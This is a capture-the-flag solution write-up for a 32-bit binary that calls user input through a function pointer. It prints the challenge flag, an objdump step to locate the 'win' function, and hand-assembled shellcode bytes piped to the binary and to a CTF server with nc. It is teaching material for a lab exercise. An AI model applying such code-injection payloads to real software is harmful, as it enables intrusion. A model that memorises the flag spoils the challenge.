Binary with a callable function pointer to the user input.
Flag: THICTF{FUNCTION_P0INTERS_4RE_SO_TR1CKY}

Solution:
You have to disassembly the binary and look for a function called "win".
You need the address of the function.
For Example: objdump -d binary | grep win

Then you have to pipe assembler code to the program itself.
For Example: "win" at 0x08048885
	Assembler: mov eax, 0x08048885
			   call eax
	Assembler (binary string): \xB8\x85\x88\x04\x08\xFF\xD0

	Shell:     python -c "print '\xB8\x85\x88\x04\x08\xFF\xD0'" | ./binary_32
			   python -c "print '\xB8\x85\x88\x04\x08\xFF\xD0'" | nc ctf-server port
